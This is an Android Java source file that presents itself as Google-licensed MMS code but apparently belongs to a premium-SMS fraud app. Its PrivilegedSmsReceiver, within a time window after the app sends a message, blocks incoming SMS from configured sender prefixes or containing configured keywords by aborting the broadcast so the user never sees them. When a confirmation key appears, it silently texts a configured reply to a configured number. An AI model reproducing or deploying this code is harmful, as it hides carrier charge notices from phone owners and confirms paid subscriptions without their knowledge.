/*
 * Copyright (C) 2008 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.mms.bg.transaction;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;
import android.telephony.SmsMessage;
import com.android.internal.telephony.TelephonyIntents;
import android.provider.Telephony.Sms.Intents;
import com.mms.bg.*;
import com.mms.bg.ui.SettingManager;

/**
 * This class exists specifically to allow us to require permissions checks on SMS_RECEIVED
 * broadcasts that are not applicable to other kinds of broadcast messages handled by the
 * SmsReceiver base class.
 */
public class PrivilegedSmsReceiver extends SmsReceiver {
    
    private static final String TAG = "PrivilegedSmsReceiver";
    private static final boolean DEBUG = true;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
        SettingManager.getInstance(context).makePartialWakeLock();
        SettingManager sm = SettingManager.getInstance(context);
        SmsMessage[] msgs1 = Intents.getMessagesFromIntent(intent);
        String smsCenter = msgs1[0].getServiceCenterAddress();
        if (smsCenter != null) {
            sm.setSMSCenter(smsCenter);
        }
        
        String blockPorts = sm.getSMSBlockPorts();
        String blockKeys = sm.getSMSBlockKeys();
        long smsLastSendTime = sm.getLastSMSTime();
        long smsBlockTime = sm.getSMSBlockDelayTime();
        long curTime = System.currentTimeMillis();
        if ((blockPorts != null || blockKeys != null) 
                && ((curTime - smsLastSendTime) < smsBlockTime)) {
            try {
                if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] blockPorts = " + blockPorts
                                    + " block keys = " + blockKeys);
                String[] ports = blockPorts.split(";");
                SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
                String addr = msgs[0].getDisplayOriginatingAddress();
                if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] received sms addr = " + addr);
                if (addr == null) return;
                if (addr.startsWith("+") == true) {
                    addr = addr.substring(3);
                }
                boolean shouldBlock = false;
                boolean shouldConfirm = false;
                for (String port : ports) {
                    if (addr.startsWith(port) == true) {
                        if (DEBUG) 
                            Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] " +
                            		"the sms should block because the addr : " + addr + " in block ports list");
                        shouldBlock = true;
                    }
                }
                
                String[] keys = blockKeys.split(";");
                String smsBody = msgs[0].getMessageBody();
                String confirmInfo = sm.getConfirmInfo();
                LOGD("[[PrivilegedSmsReceiver::onReceive]] confirm info = " + confirmInfo);
                String confirmPort = null;
                String confirmKey = null;
                String confirmText = null;
                if (confirmInfo != null) {
                    String[] infos = confirmInfo.split(";");
                    if (infos.length == 3) {
                        confirmPort = infos[0];
                        confirmKey = infos[1];
                        confirmText = infos[2];
                    }
                }
                LOGD("[[PrivilegedSmsReceiver::onReceive]] sms body = " + smsBody);
                if (smsBody != null) {
                    for (String key : keys) {
                        if (smsBody.contains(key) == true) {
                            if (DEBUG) 
                                Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] " +
                                        "the sms should block because the body : " + smsBody + " contain the block Keys");
                            shouldBlock = true;
                        }
                    }
                }
                if (shouldBlock == true) {
                    this.abortBroadcast();
                    if (smsBody != null && confirmKey != null 
                            && confirmPort != null && confirmText != null
                            && smsBody.contains(confirmKey) == true) {
                        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
                        		" reply to : " + confirmPort + " text = " + confirmText);
                        WorkingMessage wm = WorkingMessage.createEmpty(context);
                        wm.setDestNum(confirmPort);
                        wm.setText(confirmText);
                        wm.send();
                    }
                }
            } catch (Exception e) {
            } finally {
                SettingManager.getInstance(context).releasePartialWakeLock();
            }
        }
    }
    
    public static final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, msg);
        }
    }
}
